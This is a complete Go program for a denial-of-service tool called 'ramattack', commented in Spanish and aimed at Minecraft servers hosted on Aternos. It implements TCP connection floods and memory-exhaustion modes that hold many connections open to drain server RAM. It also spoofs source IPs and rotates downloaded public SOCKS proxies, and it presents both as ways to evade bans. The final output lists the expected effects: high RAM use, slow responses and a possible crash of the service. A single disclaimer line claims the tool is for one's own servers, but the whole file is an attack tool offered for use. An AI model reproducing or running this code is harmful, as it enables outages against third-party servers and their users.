package main

import (
	"bufio"
	"context"
	crand "crypto/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

// ==================== CONSTANTES ====================
const (
	MAX_TFO_QUEUE = 1000
)

var (
	stats     = &Statistics{}
	startTime = time.Now()
	running   int32 = 1
	config    AttackConfig
)

// ==================== ESTRUCTURAS ====================
type Statistics struct {
	connections        int64
	successfulAttacks  int64
	packetsSent        int64
	totalDataSent      int64
	connectionErrors   int64
	sendErrors         int64
	tcpErrors          int64
	arpPacketsSent     int64
	window0PacketsSent int64
	icmpPacketsSent    int64
	finPacketsSent     int64
	synPacketsSent     int64
	rstPacketsSent     int64
	pshPacketsSent     int64
	urgPacketsSent     int64
	ackPacketsSent     int64
	tfoPacketsSent     int64
	tfoConnections     int64
	proxiesUsed        int64
	proxyErrors        int64
	spoofedPackets     int64
	socketPacketsSent  int64
	memoryConnections  int64
}

type AttackConfig struct {
	targetIP      string
	targetPort    string
	ports         string
	threads       int
	packetSize    int
	duration      time.Duration
	mode          string
	iface         string
	useProxies    bool
	socks4        bool
	socks5        bool
	proxyURL      string
	proxyFile     string
	maxProxies    int
	spoofIP       bool
	spoofRange    string
	useSocket     bool
	memoryIntense bool
}

// ==================== IP SPOOFING MEJORADO ====================

func generateRandomByte() byte {
	b := [1]byte{}
	crand.Read(b[:])
	return b[0]
}

func generateSpoofedIP() net.IP {
	if config.spoofRange != "" {
		if ip := generateIPFromRange(config.spoofRange); ip != nil {
			return ip
		}
	}

	ip := make([]byte, 4)
	crand.Read(ip)

	// Rangos más efectivos para Aternos/ISP
	switch rand.Intn(4) {
	case 0:
		// Google Cloud
		ip[0] = 34
		ip[1] = generateRandomByte()
		ip[2] = generateRandomByte()
		ip[3] = generateRandomByte()%254 + 1
	case 1:
		// AWS
		ip[0] = 52
		ip[1] = generateRandomByte()
		ip[2] = generateRandomByte()
		ip[3] = generateRandomByte()%254 + 1
	case 2:
		// Azure
		ip[0] = 40
		ip[1] = generateRandomByte()
		ip[2] = generateRandomByte()
		ip[3] = generateRandomByte()%254 + 1
	default:
		// IPs residenciales comunes
		ip[0] = 192
		ip[1] = 168
		ip[2] = generateRandomByte()
		ip[3] = generateRandomByte()%254 + 1
	}

	return net.IP(ip)
}

func generateIPFromRange(cidr string) net.IP {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil
	}

	ones, bits := ipnet.Mask.Size()
	size := 1 << uint(bits-ones)

	if size <= 2 {
		return ipnet.IP
	}

	baseIP := binary.BigEndian.Uint32(ipnet.IP.To4())

	offsetBytes := make([]byte, 4)
	crand.Read(offsetBytes)
	offset := uint32(offsetBytes[0])%uint32(size-2) + 1

	ipInt := baseIP + offset
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, ipInt)

	return ip
}

// ==================== SOCKET PARA AGOTAR RAM ====================

// MemorySocketAttack - Socket especial para agotar RAM del servidor
func MemorySocketAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	// Pool de buffers para mantener conexiones activas
	type connBuffer struct {
		conn net.Conn
		buf  []byte
	}

	connections := make([]connBuffer, 0, 100)
	var mu sync.Mutex

	// Goroutine para mantener conexiones activas
	go func() {
		for atomic.LoadInt32(&running) == 1 {
			mu.Lock()
			for i := 0; i < len(connections) && i < 50; i++ {
				if connections[i].conn != nil {
					// Enviar datos periódicos para mantener conexión activa
					connections[i].conn.Write(connections[i].buf[:256])
					atomic.AddInt64(&stats.socketPacketsSent, 1)
					atomic.AddInt64(&stats.packetsSent, 1)
				}
			}
			mu.Unlock()
			time.Sleep(100 * time.Millisecond)
		}
	}()

	// Crear nuevas conexiones continuamente
	for atomic.LoadInt32(&running) == 1 {
		// Crear conexión con spoof si está habilitado
		var conn net.Conn
		var err error

		if config.spoofIP {
			conn, err = createSpoofedConnection(targetAddr)
		} else {
			conn, err = net.DialTimeout("tcp", targetAddr, 5*time.Second)
		}

		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(50 * time.Millisecond)
			continue
		}

		// Configurar para mantener conexión abierta
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetKeepAlive(true)
			tcpConn.SetLinger(-1) // Mantener conexión incluso después de cerrar
			tcpConn.SetReadBuffer(1024 * 1024) // 1MB buffer
			tcpConn.SetWriteBuffer(1024 * 1024) // 1MB buffer
		}

		// Crear buffer de datos
		buf := make([]byte, 65535) // Buffer grande para consumir RAM
		crand.Read(buf)

		mu.Lock()
		connections = append(connections, connBuffer{conn: conn, buf: buf})
		if len(connections) > 1000 {
			// Limitar máximo de conexiones en memoria
			for i := 0; i < 100; i++ {
				if connections[i].conn != nil {
					connections[i].conn.Close()
				}
			}
			connections = connections[100:]
		}
		mu.Unlock()

		atomic.AddInt64(&stats.connections, 1)
		atomic.AddInt64(&stats.memoryConnections, 1)

		// Enviar datos iniciales
		conn.Write(buf[:8192]) // Enviar 8KB iniciales
		atomic.AddInt64(&stats.totalDataSent, 8192)

		// Pequeña pausa para no sobrecargar nuestra propia RAM
		time.Sleep(time.Millisecond * 10)
	}

	// Limpiar conexiones al final
	mu.Lock()
	for _, cb := range connections {
		if cb.conn != nil {
			cb.conn.Close()
		}
	}
	mu.Unlock()
}

func createSpoofedConnection(target string) (net.Conn, error) {
	// Usar dialer con IP aleatoria local
	spoofedIP := generateSpoofedIP()

	dialer := &net.Dialer{
		Timeout: 5 * time.Second,
		LocalAddr: &net.TCPAddr{
			IP:   spoofedIP,
			Port: 0, // Puerto aleatorio
		},
		Control: func(network, address string, c syscall.RawConn) error {
			var operr error
			err := c.Control(func(fd uintptr) {
				// Configurar opciones de socket
				operr = syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
				if operr != nil {
					return
				}

				// Aumentar buffers
				syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_SNDBUF, 65535)
				syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_RCVBUF, 65535)
			})
			if err != nil {
				return err
			}
			return operr
		},
	}

	conn, err := dialer.Dial("tcp", target)
	if err != nil {
		// Fallback a conexión normal
		return net.DialTimeout("tcp", target, 5*time.Second)
	}

	atomic.AddInt64(&stats.spoofedPackets, 1)
	return conn, nil
}

// ==================== WINDOW0 MEJORADO PARA AGOTAR RAM ====================

func TCPWindowZero(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	// Contador de conexiones activas
	var activeConns int64

	// Semaforo para controlar goroutines
	semaphore := make(chan struct{}, 500) // Limitar a 500 conexiones simultáneas

	for atomic.LoadInt32(&running) == 1 {
		semaphore <- struct{}{}

		go func() {
			defer func() { <-semaphore }()

			// Controlar el número total de conexiones activas
			if atomic.LoadInt64(&activeConns) > 2000 {
				time.Sleep(time.Millisecond * 100)
				return
			}

			atomic.AddInt64(&activeConns, 1)
			defer atomic.AddInt64(&activeConns, -1)

			// Crear conexión
			var conn net.Conn
			var err error

			if config.spoofIP {
				conn, err = createSpoofedConnection(targetAddr)
			} else {
				conn, err = net.DialTimeout("tcp", targetAddr, 10*time.Second)
			}

			if err != nil {
				atomic.AddInt64(&stats.connectionErrors, 1)
				return
			}

			atomic.AddInt64(&stats.connections, 1)
			atomic.AddInt64(&stats.window0PacketsSent, 1)

			// Configurar para mantener conexión el mayor tiempo posible
			if tcpConn, ok := conn.(*net.TCPConn); ok {
				tcpConn.SetKeepAlive(true)
				tcpConn.SetLinger(-1)
				tcpConn.SetNoDelay(false) // Acumular datos para enviar en grandes bloques
				tcpConn.SetWriteBuffer(512 * 1024) // 512KB buffer
			}

			defer conn.Close()

			// Buffer de datos grande para consumir RAM del servidor
			bufSize := 32768 // 32KB
			if config.memoryIntense {
				bufSize = 65536 // 64KB para modo intensivo
			}

			buf := make([]byte, bufSize)
			crand.Read(buf)

			// Enviar datos en bucle para mantener la conexión activa
			for i := 0; i < 100 && atomic.LoadInt32(&running) == 1; i++ {
				// Enviar datos lentamente para acumular buffers
				n, err := conn.Write(buf)
				if err != nil {
					atomic.AddInt64(&stats.sendErrors, 1)
					break
				}

				atomic.AddInt64(&stats.packetsSent, 1)
				atomic.AddInt64(&stats.totalDataSent, int64(n))

				// Pausa variable para simular tráfico legítimo
				time.Sleep(time.Millisecond * time.Duration(50+rand.Intn(100)))
			}

			// Mantener conexión abierta incluso después de dejar de enviar
			// Esto fuerza al servidor a mantener los buffers de recepción
			time.Sleep(30 * time.Second)

			atomic.AddInt64(&stats.successfulAttacks, 1)
		}()

		// Control de tasa - más lento para acumular más conexiones
		time.Sleep(time.Millisecond * 5)
	}
}

// ==================== ATAQUE HÍBRIDO MEMORIA ====================

func HybridMemoryAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	// Combinar window0 y socket attack
	var hybridWg sync.WaitGroup

	// 70% window0, 30% socket
	window0Threads := config.threads * 7 / 10
	socketThreads := config.threads * 3 / 10

	if window0Threads < 1 {
		window0Threads = 1
	}
	if socketThreads < 1 {
		socketThreads = 1
	}

	// Iniciar ataques window0
	for i := 0; i < window0Threads; i++ {
		hybridWg.Add(1)
		go func() {
			defer hybridWg.Done()
			TCPWindowZero(targetAddr, wg)
		}()
		time.Sleep(time.Millisecond * 2)
	}

	// Iniciar ataques socket
	for i := 0; i < socketThreads; i++ {
		hybridWg.Add(1)
		go func() {
			defer hybridWg.Done()
			MemorySocketAttack(targetAddr, wg)
		}()
		time.Sleep(time.Millisecond * 2)
	}

	hybridWg.Wait()
}

// ==================== GESTIÓN DE PROXIES ====================
var (
	proxyList  []string
	proxyIndex int32 = 0
	proxyMutex sync.RWMutex
)

func downloadProxies() error {
	proxyMutex.Lock()
	defer proxyMutex.Unlock()

	proxyList = []string{}

	proxySources := []struct {
		url       string
		proxyType string
	}{
		{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", "socks4"},
		{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", "socks5"},
	}

	for _, source := range proxySources {
		if (config.socks4 && source.proxyType != "socks4") &&
			(config.socks5 && source.proxyType != "socks5") {
			continue
		}

		resp, err := http.Get(source.url)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			proxyAddr := strings.TrimSpace(scanner.Text())
			if proxyAddr == "" {
				continue
			}

			var formattedProxy string
			switch source.proxyType {
			case "socks4":
				formattedProxy = fmt.Sprintf("socks4://%s", proxyAddr)
			case "socks5":
				formattedProxy = fmt.Sprintf("socks5://%s", proxyAddr)
			}

			proxyList = append(proxyList, formattedProxy)

			if config.maxProxies > 0 && len(proxyList) >= config.maxProxies {
				break
			}
		}

		if config.maxProxies > 0 && len(proxyList) >= config.maxProxies {
			break
		}
	}

	if config.proxyFile != "" {
		loadProxiesFromFile(config.proxyFile)
	}

	if config.proxyURL != "" {
		proxyList = append(proxyList, config.proxyURL)
	}

	if len(proxyList) == 0 {
		return fmt.Errorf("no proxies loaded")
	}

	return nil
}

func loadProxiesFromFile(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxyAddr := strings.TrimSpace(scanner.Text())
		if proxyAddr == "" {
			continue
		}

		if !strings.HasPrefix(proxyAddr, "socks4://") &&
			!strings.HasPrefix(proxyAddr, "socks5://") {
			if config.socks4 {
				proxyAddr = fmt.Sprintf("socks4://%s", proxyAddr)
			} else {
				proxyAddr = fmt.Sprintf("socks5://%s", proxyAddr)
			}
		}

		proxyList = append(proxyList, proxyAddr)

		if config.maxProxies > 0 && len(proxyList) >= config.maxProxies {
			break
		}
	}
}

func getNextProxy() (string, error) {
	proxyMutex.RLock()
	defer proxyMutex.RUnlock()

	if len(proxyList) == 0 {
		return "", fmt.Errorf("no proxies available")
	}

	index := atomic.LoadInt32(&proxyIndex) % int32(len(proxyList))
	atomic.AddInt32(&proxyIndex, 1)

	return proxyList[index], nil
}

func createProxyDialer() (proxy.ContextDialer, error) {
	if !config.useProxies || len(proxyList) == 0 {
		return proxy.Direct, nil
	}

	proxyURL, err := getNextProxy()
	if err != nil {
		return proxy.Direct, err
	}

	parsedURL, err := url.Parse(proxyURL)
	if err != nil {
		atomic.AddInt64(&stats.proxyErrors, 1)
		return proxy.Direct, err
	}

	dialer, err := proxy.FromURL(parsedURL, proxy.Direct)
	if err != nil {
		atomic.AddInt64(&stats.proxyErrors, 1)
		return proxy.Direct, err
	}

	atomic.AddInt64(&stats.proxiesUsed, 1)
	return dialer.(proxy.ContextDialer), nil
}

func dialWithProxy(network, address string, timeout time.Duration) (net.Conn, error) {
	if config.spoofIP {
		return createSpoofedConnection(address)
	}

	dialer, err := createProxyDialer()
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	return dialer.DialContext(ctx, network, address)
}

// ==================== MÉTODOS DE ATAQUE ORIGINALES ====================
func TCPTfoAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func(c net.Conn) {
			defer func() {
				c.Close()
				atomic.AddInt64(&stats.tfoPacketsSent, 1)
				atomic.AddInt64(&stats.successfulAttacks, 1)
			}()

			buf := make([]byte, config.packetSize)
			crand.Read(buf)
			c.Write(buf)
			atomic.AddInt64(&stats.packetsSent, 1)
			atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPFinAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func(c net.Conn) {
			defer func() {
				c.Close()
				atomic.AddInt64(&stats.finPacketsSent, 1)
				atomic.AddInt64(&stats.successfulAttacks, 1)
			}()

			buf := make([]byte, config.packetSize)
			crand.Read(buf)
			c.Write(buf)
			atomic.AddInt64(&stats.packetsSent, 1)
			atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPSynAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 1*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(5 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)
		atomic.AddInt64(&stats.synPacketsSent, 1)
		conn.Close()
		time.Sleep(1 * time.Millisecond)
	}
}

func TCPRstAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetLinger(0)
		}

		go func(c net.Conn) {
			defer func() {
				c.Close()
				atomic.AddInt64(&stats.rstPacketsSent, 1)
				atomic.AddInt64(&stats.successfulAttacks, 1)
			}()

			buf := make([]byte, 64)
			crand.Read(buf)
			c.Write(buf)
			atomic.AddInt64(&stats.packetsSent, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

// ==================== FUNCIONES AUXILIARES ====================
func getSystemStats() map[string]float64 {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	var memoryPercent float64
	if m.Sys > 0 {
		memoryPercent = float64(m.Alloc) / float64(m.Sys) * 100
	}

	return map[string]float64{
		"memory_percent": memoryPercent,
		"goroutines":     float64(runtime.NumGoroutine()),
	}
}

func printStats() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for atomic.LoadInt32(&running) == 1 {
		<-ticker.C

		duration := time.Since(startTime).Seconds()
		systemStats := getSystemStats()

		separator := strings.Repeat("=", 60)
		fmt.Printf("\n%s\n", separator)
		fmt.Printf("🔥 ATAQUE RAM - Aternos/GmH ISP\n")
		fmt.Printf("Target: %s | Port: %s\n", config.targetIP, config.targetPort)
		fmt.Printf("%s\n", separator)

		fmt.Printf("Tiempo: %.0fs | Hilos: %d\n", duration, config.threads)
		fmt.Printf("Conexiones: %d | MemConn: %d\n",
			atomic.LoadInt64(&stats.connections), atomic.LoadInt64(&stats.memoryConnections))

		if config.spoofIP {
			fmt.Printf("IP Spoofing: ✅ ACTIVO\n")
			if config.spoofRange != "" {
				fmt.Printf("Rango: %s\n", config.spoofRange)
			}
		}

		if config.useSocket {
			fmt.Printf("Socket Attack: %d paquetes\n", atomic.LoadInt64(&stats.socketPacketsSent))
		}

		if config.mode == "window0" || config.mode == "hybrid" {
			fmt.Printf("Window0: %d paquetes\n", atomic.LoadInt64(&stats.window0PacketsSent))
		}

		if duration > 0 {
			rate := float64(atomic.LoadInt64(&stats.packetsSent)) / duration
			fmt.Printf("Tasa: %.1f pps | ", rate)

			if totalData := atomic.LoadInt64(&stats.totalDataSent); totalData > 0 {
				bandwidth := (float64(totalData) / (1024 * 1024)) / duration
				fmt.Printf("Ancho: %.2f MB/s\n", bandwidth)
			}
		}

		fmt.Printf("RAM Atacante: %.1f%% | Goroutines: %.0f\n",
			systemStats["memory_percent"], systemStats["goroutines"])
		fmt.Printf("%s\n", separator)
	}
}

func optimizeSystemLimits() {
	// Aumentar límites del sistema
	var rLimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit); err == nil {
		rLimit.Cur = 65535
		rLimit.Max = 65535
		syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	}

	// Configurar GC para menos intervención
	runtime.GOMAXPROCS(runtime.NumCPU())
	debug.SetGCPercent(500) // GC menos frecuente
}

func parsePorts(portsStr string) []string {
	var ports []string

	portList := strings.Split(portsStr, ",")

	for _, port := range portList {
		port = strings.TrimSpace(port)

		if strings.Contains(port, "-") {
			parts := strings.Split(port, "-")
			if len(parts) == 2 {
				start, err1 := strconv.Atoi(parts[0])
				end, err2 := strconv.Atoi(parts[1])
				if err1 == nil && err2 == nil && start <= end {
					for i := start; i <= end; i++ {
						ports = append(ports, strconv.Itoa(i))
					}
				}
			}
		} else {
			ports = append(ports, port)
		}
	}

	if len(ports) == 0 {
		ports = []string{"25565"} // Puerto default Minecraft para Aternos
	}

	return ports
}

func attackPort(port string, wg *sync.WaitGroup) {
	targetAddr := net.JoinHostPort(config.targetIP, port)
	config.targetPort = port

	switch config.mode {
	case "window0":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPWindowZero(targetAddr, wg)
		}
	case "socket":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go MemorySocketAttack(targetAddr, wg)
		}
	case "hybrid":
		for i := 0; i < config.threads/2+1; i++ {
			wg.Add(1)
			go HybridMemoryAttack(targetAddr, wg)
		}
	case "syn":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPSynAttack(targetAddr, wg)
		}
	case "rst":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPRstAttack(targetAddr, wg)
		}
	case "fin":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPFinAttack(targetAddr, wg)
		}
	case "tfo":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPTfoAttack(targetAddr, wg)
		}
	default:
		// Por defecto usar hybrid
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go HybridMemoryAttack(targetAddr, wg)
		}
	}
}

// ==================== FUNCIÓN PRINCIPAL ====================
func main() {
	// Inicializar semilla para math/rand
	seedBytes := make([]byte, 8)
	crand.Read(seedBytes)
	seed := int64(binary.BigEndian.Uint64(seedBytes))
	rand.Seed(seed)

	flag.StringVar(&config.targetIP, "ip", "", "IP objetivo (requerido)")
	flag.StringVar(&config.ports, "ports", "25565", "Puertos (ej: 25565,25566)")
	flag.IntVar(&config.threads, "threads", 500, "Hilos por puerto")
	flag.IntVar(&config.packetSize, "size", 65535, "Tamaño de paquete")
	flag.StringVar(&config.mode, "mode", "hybrid", "Modo: window0,socket,hybrid,syn,rst,fin,tfo")
	flag.DurationVar(&config.duration, "duration", 0, "Duración (ej: 30s, 5m)")
	flag.BoolVar(&config.useProxies, "proxies", false, "Usar proxies")
	flag.BoolVar(&config.socks4, "socks4", false, "Usar SOCKS4")
	flag.BoolVar(&config.socks5, "socks5", false, "Usar SOCKS5")
	flag.StringVar(&config.proxyURL, "proxy-url", "", "Proxy individual")
	flag.StringVar(&config.proxyFile, "proxy-file", "", "Archivo de proxies")
	flag.IntVar(&config.maxProxies, "max-proxies", 0, "Máximo de proxies")
	flag.BoolVar(&config.spoofIP, "spoof", false, "Activar IP Spoofing (S/N)")
	flag.StringVar(&config.spoofRange, "spoof-range", "", "Rango IP para spoof (ej: 192.168.1.0/24)")
	flag.BoolVar(&config.useSocket, "socket", true, "Usar ataque socket")
	flag.BoolVar(&config.memoryIntense, "intense", false, "Modo intensivo de RAM")

	flag.Parse()

	if config.targetIP == "" {
		fmt.Println("ERROR: Se requiere IP objetivo")
		fmt.Println("\nUso: ./ramattack -ip IP [opciones]")
		fmt.Println("\nOpciones principales:")
		fmt.Println("  -ip IP              IP objetivo (ej: server.aternos.me)")
		fmt.Println("  -ports PORTS        Puertos (default: 25565)")
		fmt.Println("  -threads N          Hilos (default: 500)")
		fmt.Println("  -mode MODE          window0,socket,hybrid (recomendado)")
		fmt.Println("  -spoof true/false   IP Spoofing (evita baneo)")
		fmt.Println("  -duration TIME      Duración del ataque")
		fmt.Println("  -intense true/false Modo intensivo RAM")
		fmt.Println("\nEjemplos:")
		fmt.Println("  ./ramattack -ip server.aternos.me -mode hybrid -threads 1000 -spoof true")
		fmt.Println("  ./ramattack -ip 192.168.1.100 -ports 25565,25566 -mode window0 -threads 2000")
		fmt.Println("  ./ramattack -ip target.com -mode socket -spoof true -duration 10m")
		os.Exit(1)
	}

	// Optimizar sistema
	optimizeSystemLimits()

	// Verificar si es Aternos
	if strings.Contains(config.targetIP, "aternos") {
		fmt.Println("🎯 Detectado servidor Aternos - Optimizando ataque...")
		config.memoryIntense = true
		if !config.spoofIP {
			fmt.Println("⚠️  Recomendado usar -spoof true para evitar baneo rápido")
		}
	}

	// Cargar proxies si es necesario
	if config.useProxies {
		fmt.Println("🔗 Cargando proxies...")
		if err := downloadProxies(); err != nil {
			fmt.Printf("⚠️  %v\n", err)
			config.useProxies = false
		} else {
			fmt.Printf("✅ %d proxies cargados\n", len(proxyList))
		}
	}

	// Mostrar configuración
	separator := strings.Repeat("═", 60)
	fmt.Printf("\n%s\n", separator)
	fmt.Printf("🔥 ATAQUE DE RAM - Especial Aternos/ISP GmH\n")
	fmt.Printf("%s\n", separator)
	fmt.Printf("Objetivo: %s\n", config.targetIP)
	fmt.Printf("Puertos: %s\n", config.ports)
	fmt.Printf("Modo: %s | Hilos: %d\n", strings.ToUpper(config.mode), config.threads)

	if config.spoofIP {
		fmt.Printf("IP Spoofing: ✅ ACTIVADO")
		if config.spoofRange != "" {
			fmt.Printf(" (Rango: %s)", config.spoofRange)
		}
		fmt.Println()
	} else {
		fmt.Printf("IP Spoofing: ❌ DESACTIVADO (riesgo de baneo)\n")
	}

	if config.memoryIntense {
		fmt.Printf("Modo RAM Intensivo: ✅ ACTIVADO\n")
	}

	if config.duration > 0 {
		fmt.Printf("Duración: %v\n", config.duration)
	}

	fmt.Printf("%s\n", separator)
	fmt.Printf("⚠️  Este ataque está diseñado para AGOTAR RAM del servidor\n")
	fmt.Printf("⚠️  Usar solo para pruebas en servidores propios\n")
	fmt.Printf("%s\n", separator)

	// Configurar temporizador si hay duración
	if config.duration > 0 {
		go func() {
			time.Sleep(config.duration)
			fmt.Printf("\n⏰ Tiempo completado\n")
			atomic.StoreInt32(&running, 0)
		}()
	}

	// Iniciar estadísticas
	go printStats()

	// Iniciar ataque
	var wg sync.WaitGroup
	ports := parsePorts(config.ports)

	for _, port := range ports {
		fmt.Printf("\n🎯 Atacando puerto %s con modo %s...\n", port, config.mode)
		attackPort(port, &wg)
		time.Sleep(500 * time.Millisecond)
	}

	fmt.Printf("\n✅ Ataque iniciado - Consumiendo RAM del objetivo...\n")
	fmt.Printf("📊 Estadísticas cada 3 segundos\n")
	fmt.Printf("Presiona Ctrl+C para detener\n")

	// Esperar señal
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	<-sigCh

	fmt.Printf("\n🛑 Deteniendo ataque...\n")
	atomic.StoreInt32(&running, 0)
	wg.Wait()

	// Estadísticas finales
	printFinalStats()
}

func printFinalStats() {
	duration := time.Since(startTime)

	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("🎯 RESUMEN FINAL - Duración: %v\n", duration)
	fmt.Printf("%s\n", strings.Repeat("=", 60))

	fmt.Printf("📊 ESTADÍSTICAS:\n")
	fmt.Printf("  Conexiones totales: %d\n", atomic.LoadInt64(&stats.connections))
	fmt.Printf("  Conexiones RAM: %d\n", atomic.LoadInt64(&stats.memoryConnections))
	fmt.Printf("  Paquetes enviados: %d\n", atomic.LoadInt64(&stats.packetsSent))
	fmt.Printf("  Datos enviados: %.2f MB\n",
		float64(atomic.LoadInt64(&stats.totalDataSent))/(1024*1024))

	if config.spoofIP {
		fmt.Printf("  Paquetes spoofed: %d\n", atomic.LoadInt64(&stats.spoofedPackets))
	}

	if config.useSocket {
		fmt.Printf("  Paquetes socket: %d\n", atomic.LoadInt64(&stats.socketPacketsSent))
	}

	if config.mode == "window0" || config.mode == "hybrid" {
		fmt.Printf("  Paquetes window0: %d\n", atomic.LoadInt64(&stats.window0PacketsSent))
	}

	// Rendimiento
	if duration.Seconds() > 0 {
		packetRate := float64(atomic.LoadInt64(&stats.packetsSent)) / duration.Seconds()
		dataRate := float64(atomic.LoadInt64(&stats.totalDataSent)) /
			(1024 * 1024 * duration.Seconds())

		fmt.Printf("\n⚡ RENDIMIENTO:\n")
		fmt.Printf("  Tasa promedio: %.1f paquetes/seg\n", packetRate)
		fmt.Printf("  Ancho banda: %.2f MB/seg\n", dataRate)
		fmt.Printf("  Conexiones/seg: %.1f\n",
			float64(atomic.LoadInt64(&stats.connections))/duration.Seconds())
	}

	fmt.Printf("\n⚠️  El objetivo debería estar experimentando:\n")
	fmt.Printf("  - Alto consumo de RAM\n")
	fmt.Printf("  - Lentitud en respuestas\n")
	fmt.Printf("  - Posible caída del servicio\n")

	fmt.Printf("%s\n", strings.Repeat("=", 60))
}
